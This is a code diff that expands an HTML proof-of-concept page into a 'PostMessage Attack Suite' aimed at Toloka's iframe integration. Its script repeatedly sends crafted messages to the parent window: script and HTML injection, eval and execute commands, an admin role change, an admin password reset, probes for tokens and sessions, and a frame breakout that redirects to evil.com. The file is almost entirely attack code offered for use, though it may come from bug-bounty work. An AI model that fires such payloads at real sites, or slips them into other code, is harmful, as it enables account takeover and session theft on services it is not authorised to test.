@@ -1,39 +1,114 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PostMessage PoC</title>
+  <title>PoC - Wide PostMessage Attack</title>
   <style>
     body {
-      background: #121212;
-      color: #00ff99;
+      background-color: #000;
+      color: #00FF99;
       font-family: monospace;
+      padding: 2em;
       text-align: center;
-      padding-top: 50px;
+    }
+    code {
+      background: #111;
+      padding: 0.3em 0.5em;
+      display: inline-block;
+      margin-top: 1em;
     }
   </style>
 </head>
 <body>
-  <h1>📡 PoC: PostMessage Test</h1>
-  <p>Sending messages to parent every 3 seconds...</p>
+  <h1>📡 Toloka iframe PostMessage Attack Suite</h1>
+  <p>Sending crafted messages every 3 seconds</p>
+  <code id="last">No messages sent yet...</code>
 
   <script>
-    // إرسال رسالة بسيطة كل 3 ثوانٍ
-    setInterval(() => {
-      const payload = {
-        type: "test-message",
-        msg: "🔥 Hello from iframe at " + location.origin,
-        timestamp: new Date().toISOString()
+    const testPayloads = [
+      // 🔹 Simple control/echo types
+      { type: "ping" },
+      { type: "init" },
+      { type: "ready" },
+      { type: "hello", data: "iframe connected" },
+
+      // 🔹 Commands that could trigger actions
+      { command: "render", html: "<h1>Injected HTML</h1>" },
+      { command: "setTheme", theme: "dark" },
+      { command: "navigate", to: "/admin" },
+      { command: "updateUser", data: { role: "admin" } },
+
+      // 🔹 Dangerous attempts
+      { type: "eval", code: "alert('Eval!')" },
+      { type: "scriptInject", script: "alert('script injected')" },
+      { command: "execute", action: "alert('exec')" },
+
+      // 🔹 Common framework patterns
+      { method: "postMessage", args: ["<script>alert('hi')</script>"] },
+      { method: "set", key: "token", value: "abc123" },
+      { method: "emit", event: "login", payload: { success: true } },
+      { method: "call", name: "setTheme", params: ["dark"] },
+
+      // 🔹 Fake system calls
+      { syscall: "debug.enable" },
+      { syscall: "debug.dumpState" },
+      { syscall: "account.resetPassword", email: "admin@toloka.dev" },
+
+      // 🔹 Token extraction probes
+      { action: "getAccessToken" },
+      { action: "readStorage" },
+      { action: "leakSession" },
+
+      // 🔹 Events injection
+      { event: "click", target: "#submit" },
+      { event: "keyup", key: "Enter" },
+      { event: "keydown", key: "Escape" },
+
+      // 🔹 CSP or sandbox probes
+      { probe: "sandbox-check" },
+      { probe: "csp-bypass" },
+      { type: "breakout", attempt: "window.top.location = 'https://evil.com'" },
+
+      // 🔹 Timing / loading probes
+      { type: "loadEventProbe", data: Date.now() },
+      { type: "fpsMonitor" },
+
+      // 🔹 Replay or unexpected format
+      "RAW_STRING_MSG",
+      "<script>alert('raw')</script>",
+      1337,
+      null,
+      undefined,
+      [],
+      {},
+    ];
+
+    let index = 0;
+    const sendMessage = () => {
+      const payload = testPayloads[index % testPayloads.length];
+      const wrapped = {
+        payload,
+        sentFrom: location.origin,
+        sentAt: new Date().toISOString()
       };
 
-      window.parent.postMessage(payload, "*");
+      try {
+        window.parent.postMessage(wrapped, "*");
+        console.log("📤 Sent message to parent:", wrapped);
+        document.getElementById("last").textContent = "Last sent: " + JSON.stringify(payload);
+      } catch (err) {
+        console.error("❌ Error sending message:", err);
+      }
 
-      console.log("📤 Sent postMessage to parent:", payload);
-    }, 3000);
+      index++;
+    };
 
-    // استقبال أي رد من parent
+    // Send message every 3s
+    setInterval(sendMessage, 3000);
+
+    // Listen to any replies
     window.addEventListener("message", (event) => {
-      console.log("📥 Received message from parent:", event.data);
+      console.log("📥 Received message from parent:", event.origin, event.data);
     });
   </script>
 </body>
